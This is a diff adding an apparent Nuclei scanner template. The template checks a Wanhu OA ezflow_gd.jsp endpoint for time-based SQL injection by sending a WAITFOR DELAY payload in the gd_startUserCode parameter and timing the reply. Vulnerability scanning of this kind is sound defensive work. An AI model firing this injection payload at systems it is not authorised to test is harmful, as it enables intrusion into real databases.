@@ -1,0 +1,22 @@
+id: wanhu-ezflowgd-sqli
+
+info:
+  name: wanhu-ezflowgd-sqli
+  author: xiaokp7
+  severity: critical
+
+http:
+  - raw:
+    - |
+      GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3BWAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+      Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl: 
+          - 'duration>5 && duration<6'
